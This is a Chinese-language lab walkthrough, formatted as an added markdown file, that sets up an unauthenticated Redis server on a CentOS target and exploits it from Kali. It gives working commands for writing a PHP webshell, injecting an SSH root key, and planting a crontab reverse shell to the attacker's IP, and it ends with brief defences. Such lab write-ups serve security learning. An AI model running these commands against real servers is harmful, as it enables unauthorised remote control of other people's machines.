@@ -1,0 +1,300 @@
+# 一、前言
+
+Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。
+
+## 二、redis未授权访问漏洞简介及危害
+
+    
+    
+    Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。
+    
+
+该漏洞的产生条件有以下两点：
+
+1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；  
+2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。
+
+漏洞危害：  
+(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；  
+(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；  
+(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器;
+
+# 三，redis环境部署
+
+漏洞靶机（Centos7.9）：192.168.55.136  
+攻击机（kali）：192.168.55.129
+
+1、安装redis  
+①首先可以创建用于安装redis文件配置的目录
+
+    
+    
+    mkdir /usr/local/redis
+    
+
+②进入redis文件并下载redis安装包
+
+    
+    
+    cd /usr/local/redis/
+    wget http://download.redis.io/releases/redis-3.2.0.tar.gz
+    
+
+其中wget是一个下载文件的工具，它用在命令行下，通常在我们经常要下载一些软件或从远程服务器恢复备份到本地服务器时使用；  
+![图片.png](https://image.3001.net/images/20210923/1632368424_614bf728d6ee3c1aac40a.png!small)  
+`tar xzf redis-3.2.0.tar.gz`在当前地址进行解压，生成redis-3.2.0文件夹  
+![图片.png](https://image.3001.net/images/20210923/1632368457_614bf749950646d3d7be0.png!small)③
+进入解压后的redis-3.2.0文件夹  
+`cd /usr/local/redis/redis-3.2.0`  
+`make`编译安装
+
+> 注:  
+>
+> make工具是一个根据makefile文件内容，针对目标（可执行文件）进行依赖性检测（要生成该可执行文件之前要有哪些中间文件）并执行相关动作（编译等）的工具  
+> 。而这个makefile文件类似一个脚本，其中内容包含make所要进行的处理动作以及依赖关系。  
+> 另外make的一个好处就是当你对某个源文件进行了修改，你再次执行 make
+> 命令，它将只编译与该源文件相关的目标文件而不是整个代码工程，结果生成.o和可执行文件：
+
+④编译后出现如下界面显示成功，编译好了redis文件；  
+![图片.png](https://image.3001.net/images/20210923/1632368512_614bf780a40cac6297bdb.png!small)⑤vim
+redis.conf --->修改默认配置文件  
+![图片.png](https://image.3001.net/images/20210923/1632368522_614bf78a2b60100b78125.png!small)注意一下这一步:按小编的配置路径的话：  
+redis在 /usr/local/redis/redis-3.2.0 src文件夹是在/usr/local/src
+
+> 对文件路径绕混的小伙伴可以看，页面的home文件下-->other locations-->usr-->~~
+
+redis安装完成,我们需要修改配置文件，配置允许可以远程访问。
+
+⑥配置文件详情(特别注意)
+
+两种方法:
+
+> ①一处：在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。
+>
+> ②一处#去掉，二处开启bind 127.0.0.1回环地址(保留地址)，意思就是可以连接本机，用redis连接本机也有效;
+>
+> 开启192.168.55.136是由于可以使目标机索引本机ip，不可能别人连接你的回环地址吧；同时也要将protected-mode设置为no；
+
+修改文件时vi命令模式时查询的命令 /xx，n向下查询N向上查询，查找那个protected-mode开关；
+
+# 四，靶机CS的环境部署及攻击机Kali的战斗部署
+
+###  **一，对靶机CS的环境部署**
+
+1，想要启动redis-server和redis-cli不用每次都进入安装目录，可以复制执行的这两个文件放到etc文件下，但不是特别建议，毕竟为系统配置文件夹，少放点好，只是为了实验方便。
+
+    
+    
+    cd src
+     cp redis-cli /usr/bin
+     cp redis-server /usr/bin
+     cp redis.conf /etc/
+    
+
+2，启动redis-server
+
+    
+    
+    redis-server /etc/redis.conf
+    
+
+显示如下界面就成功了  
+![图片.png](https://image.3001.net/images/20210923/1632368551_614bf7a7b9d75adf89831.png!small)3，验证是否成功启动了redis服务
+
+    
+    
+    netstat -nulpt|grep 6379/redis
+    
+    ps -ef | grep redis
+    
+
+###
+①![图片.png](https://image.3001.net/images/20210923/1632368575_614bf7bf5c029ac380bf0.png!small)  
+②![在这里插入图片描述](https://image.3001.net/images/20210923/1632368268_614bf68c5d5d3a261e7a5.png!small)
+**二，攻击机对kali系统的战斗部署**
+
+4,配置安装(启动redis)好环境，俺们都是大聪明~_~，那直接上原先的代码
+
+    
+    
+    mkdir /usr/local/redis
+    
+    cd /usr/local/redis/
+    wget http://download.redis.io/releases/redis-3.2.0.tar.gz
+    
+    tar xzf redis-3.2.0.tar.gz cd /usr/local/redis/redis-3.2.0  进入redis
+    make 
+    
+    redis-server /etc/redis.conf
+    
+
+5，大快人心的时刻，验证未授权访问
+
+首先在攻击机kali上扫描靶机开启的端口情况
+
+`nmap -p 6379 --script redis-info 192.168.55.136`\-->验证Redis未授权访问漏洞  
+![图片.png](https://image.3001.net/images/20210923/1632368608_614bf7e093f02376eadc5.png!small)扫描结果：扫描出来靶机CS(centos7)在6379端口开启了redis服务;  
+6,开始战斗模式啦  
+![图片.png](https://image.3001.net/images/20210923/1632368665_614bf8198118a0d5722a4.png!small)
+
+    
+    
+    ./redis-cli -h 192.168.55.136 -p 6379
+    
+
+# 五，漏洞复现过程中可能出现的一些问题
+
+ **num1** \--> **连接不上，被靶机redis拒绝访问**  
+![图片.png](https://image.3001.net/images/20210923/1632368685_614bf82d63e6e71609762.png!small)
+这时查看centos防火墙是否关闭，并查看1、安装redis的第三步③是否正确配置；
+
+防火墙的开关：(1）关闭防火墙：systemctl stop firewalld
+
+（2）检查防火墙状态：systemctl status firewalld
+
+想要了解关于防火墙命令的小知识请看俺的其他小文章哦~~~
+
+ **num2** \--> **Could not connect to Redis at 192.168.1.103:6379:No route to
+host**
+
+应该是centos的防火墙还没有开启6379端口，所以无法进行访问。这里需要打开端口模拟真实环境才能正常连接。
+
+`firewall-cmd --zone=public --add-port=6379/tcp --permanent`开放6379端口  
+`firewall-cmd --reload`配置立即生效
+
+绕后再次连接即可成功了；
+
+ **num3** \-->出现以下页面，同num1处理方式一样,得开放本机ip被远程连接；  
+![图片.png](https://image.3001.net/images/20210923/1632368733_614bf85dcdf30bd490564.png!small)
+
+# 六，漏洞利用的小姿势
+
+ **Num1-- >简单利用点**
+
+主要是需要了解Redis的常见基本命令  
+① info 查看redis版本信息、一些具体信息、服务器版本信息等等：  
+②获取默认的redis目录、和rdb文件名：
+
+    
+    
+    CONFIG GET dir
+     CONFIG GET dbfilename
+    
+
+**Num2-- >进阶利用**
+
+### 1、获取web服务的webshell
+
+    
+    
+    靶机Centos7:192.168.55.136
+    攻击机kali：192.168.55.129
+    
+
+前提:当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。
+
+①服务器开启web服务，可以通过下载phpstudy集成环境，开启apache服务；通过访问local
+
+host/127.0.0.1看apache是否配置成功且为开启状态；![图片.png](https://image.3001.net/images/20210923/1632368848_614bf8d0cc91d9b0c137e.png!small)
+
+>
+> 注：1，页面显示成功如果无法访问网站目录下的文件(显示未找到该文件)，查看文件是否支持(terrell,root)用户访问，或者查看apache配置文件看默认访问路径指向哪里；网站目录太难记可以修改，但需要同时修改apache默认首页路径，保持二者一致；  
+>
+> ![图片.png](https://image.3001.net/images/20210923/1632368862_614bf8de0642c059f9ae5.png!small)
+
+应对方式:前者通过修改 chgrp -R terrell index.html chown -R terrell
+index.html;后者，查看网站根目录下是否含有默认首页的指定文件；
+
+2，防火墙是否关闭![图片.png](https://image.3001.net/images/20210923/1632368872_614bf8e84bfbb29a9528a.png!small)
+
+②执行以下命令
+
+config set dir /www/admin/localhost_80/wwwroot -->对该文件进行操作  
+config set dbfilename shell.php -->在该文件中创建.php文件  
+set x "一句话木马"  
+save
+
+即可将shell写入web目录  
+然后连接就ok了；![图片.png](https://image.3001.net/images/20210923/1632369946_614bfd1aae6c3b9370f13.png!small)
+
+### 2、写ssh-keygen公钥登录服务器
+
+在以下条件下，可以利用此方法
+
+· 1、Redis服务使用root账号启动
+
+· 2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。
+
+注:靶机是否设置了密码
+
+此方法具体参考：[redis配置不当可直接导致服务器被控制](https://www.secpulse.com/archives/40406.html)
+
+在靶机中创建ssh公钥存放目录（一般是/root/.ssh)
+
+    
+    
+    mkdir /root/.ssh  .类文件被系统隐藏
+    
+
+靶机中开启redis服务
+
+    
+    
+    redis-server  /etc/redis.conf
+    
+
+然后攻击机在本地生成一对密钥 被SHA256加密过
+
+ssh-keygen -t rsa  
+![图片.png](https://image.3001.net/images/20210923/1632369363_614bfad38115cc049ad4a.png!small)查看密钥  
+![图片.png](https://image.3001.net/images/20210923/1632369379_614bfae3a382913cf8603.png!small)3，save
+执行
+
+4， ssh -i id_rsa root@192.168.55.136 退出连接，进行远程登录  
+![图片.png](https://image.3001.net/images/20210923/1632369455_614bfb2f9429e7fa29243.png!small)5，获取shell  
+`ls 、pwd 、cat /etc/passwd`常用命令进行测试执行
+
+### 3、利用计划任务执行命令反弹shell
+
+原理：
+
+首先同样利用了redis数据库的备份功能，在我们不知道网站绝对路径的时候，可以利用linux的定时任务特性：因为Linux会监测/etc/crontab的内容，当我们将反弹shell的命令使用redis备份到/etc/crontab中，就可以获得反弹shell。
+
+> /var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名 注意：  
+> 在不同系统中，root的位置是不一样的  
+>
+> 在kali和ubantu中，其文件位置为/var/spool/cron/crontabs/root，在centos系列中位置为/var/spool/cron/root，通常情况下没有root文件，需要自己创建
+
+在redis以root权限运行时可以写crontab来执行命令反弹shell，建议同时开两个shell  
+1，先在自己的服务器上监听一个端口
+
+nc -lvnp 6666
+
+2，然后执行以下命令:192.168.55.129为攻击机kali
+
+    
+    
+    redis-cli -h 192.168.55.136
+    set xxx "\n\n* * * * * bash -i>& /dev/tcp/192.168.55.129/6666 0>&1\n\n"
+    config set dir /var/spool/cron
+    config set dbfilename root
+    save
+    
+
+测试结果如下:![图片.png](https://image.3001.net/images/20210923/1632369812_614bfc946dc77fa89ae23.png!small)反弹shell时“
+set xxx "\n\n* * * * * bash -i>& /dev/tcp/192.168.55.129/6666 0>&1\n\n" ”
+
+>
+> //添加名为xxx的key，值为后面反弹shell的语句,5个星号代表每分钟执行一次，开始和结束的\n必须要有一个，也就是前后各有一个，当然，多个可以，主要是为了避免crontab的语法错误。
+
+# 七，防御方法
+
+> 1、禁止外部访问Redis服务端口;
+>
+> 2、禁止使用root权限启动redis服务;
+>
+> 3、配置安全组，限制可连接Redis服务器的IP;
+
+其他利用姿势有待后续学习更新~  
+各位道友学习后有疑问互相探讨哦，星海中探寻知识！！！
+
